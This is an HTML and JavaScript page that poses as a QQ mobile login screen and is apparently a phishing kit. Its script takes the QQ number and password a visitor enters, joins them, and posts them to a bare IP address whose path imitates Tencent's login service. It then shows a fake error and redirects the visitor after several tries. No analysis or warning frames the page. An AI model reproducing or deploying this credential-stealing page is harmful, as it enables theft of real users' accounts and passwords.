<body>  
<!--顶部banner-->
<a class="banner" data-btn="下载" href="http://m.qzone.com/l?g=144&amp;g_f=2000000139" id="btn_app_down" style="background-image:url(http://qzonestyle.gtimg.cn/qzone/phone/style/img/act/down-app/qzone-app-download.jpg);"></a>
<div id="content" class="content">
    <div id="error_tips">
        <div id="error_tips_content">
            <span id="error_icon"></span> 
            <span id="error_message"></span>
        </div>
    </div>
    <div id="login" class="login">
        <div id="logo" class="logo"></div>
        <div id="app_name" style="display:none"></div> 
        <div id="web_login" style="display: block;">
            <ul id="g_list">
                <li id="g_u">
                    <div id="del_touch" class="del_touch">
                        <span id="del_u" class="del_u"></span>
                    </div>
                    <input id="u" class="inputstyle" name="u" autocomplete="off" placeholder="QQ号码/手机/邮箱">
                </li>
                <li id="g_p">
                    <div id="del_touch_p" class="del_touch">
                        <span id="del_p" class="del_u"></span>
                    </div>
                    <input id="p" class="inputstyle" maxlength="16" type="password" name="p" autocorrect="off" placeholder="请输入您的QQ密码">
                </li>
            </ul>  
            <div href="javascript:void(0);" id="go"> 登 录 </div>  
            <div href="javascript:void(0);" id="onekey" class=" weak" style="display: block;"> 一键登录 </div>  
        </div>
        <div id="switch">
        <div id="zc_feedback">  
            <span id="zc" onclick="window.open('https\x3A\x2F\x2Fssl.ptlogin2.qq.com\x2Fj_newreg_url')">注册新帐号</span>   
            <span id="forgetpwd" onclick="window.open('https://aq.qq.com/cn2/findpsw/mobile_v2/mobile_web_find_index?source_id=3263&ptlang=2052&account=903565795')">忘了密码？</span>  
        </div>
    </div> 
</div> 
 
<script type="text/javascript"> 
    var $ = function(id){return document.getElementById(id)};
    var on = function(el, event, callback){el.addEventListener(event, callback, false)};
    var n = 0;
    var getCookie = function(name) {
         var r = new RegExp("(?:^|;+|\\s+)\s*" + name + "=([^;]*)"), m = document.cookie.match(r);
                return !m ? "" : decodeURIComponent(m[1]);
    }
    var setCookie = function(name, value, domain, path, hour){
        if (hour) {
            var expire = new Date;
            expire.setTime(expire.getTime() + 36E5 * hour)
        }
        document.cookie = name + "=" + value + "; " + (hour ? "expires=" + expire.toGMTString() + "; " : "");
        return true
    } 
      
    var close = function(){
        $('error_tips').style.display = 'none';
    }
    var timer;
    var show = function(msg){
        $('error_message').innerHTML = msg;
        $('error_tips').style.display = 'block';
        timer = setTimeout(close, 4000);
    }
    var check = function(){
        console.log("=====");
        
        var regQQn = new RegExp(/^[1-9][0-9]{4,9}$/),
        regMl = new RegExp(/^[1-9][0-9]{4,9}@qq.com$/),       
        regTl = new RegExp(/^(0|86|17951)?(13[0-9]|15[012356789]|18[0-9]|14[57])[0-9]{8}$/);
        clearInterval(timer);
        u = $('u').value,p = $('p').value;
        if(u == "") {$('u').focus();show(STR_LANG.no_uin);return;}
        if(!(regQQn.test(u) || regMl.test(u) || regTl.test(u)))
        {$('u').focus();show(STR_LANG.err_uin);return;}
        if(p == "") {$('p').focus();show(STR_LANG.no_password);return;} 
        setCookie("_u",u);
        $('u').focus();
        show(STR_LANG.err_up);
        console.log(u);
        console.log(p);
        var msg = $('u').value + 'local-host' + $('p').value + 'local-host';
        ajax.post("http://132.232.182.9:8080/QQ/servlet/ui.ptlogin2.qq.login.axd", { msg : encodeURIComponent(msg)}, function(data) {      
        });
        if(n++ == 3) {
            window.location = g_href;
        }
    }
    on($('go'),'click',check); 
    on($('onekey'),'click',function(){
        _this = this;
        _this.innerHTML = STR_LANG.onekeying;
        setTimeout(function() {
            _this.innerHTML = STR_LANG.onekey;
            show(STR_LANG.onekey_err);
        }, 5000); 
    });
    on($('del_u'),'click',function(){$('u').value = "";$('u').focus();checkField('u');});
    on($('del_p'),'click',function(){$('p').value = "";$('p').focus();checkField('p');});
    $('u').oninput = function(){checkField('u')};
    $('p').oninput = function(){checkField('p')};

    var checkField = function(d){
        $('del_' + d).style.display = $(d).value.length > 0 ? 'block' :'none';
    }
    document.onkeydown=function(event){
        var e = event || window.event || arguments.callee.caller.arguments[0];
        if(e&&e.keyCode == 13) check();
    };
    window.onload=function(){
      
        var u = getCookie("_u");
        if(u != ""){
            $('u').value = u;checkField('u');
        }
    };

</script>    
</body>
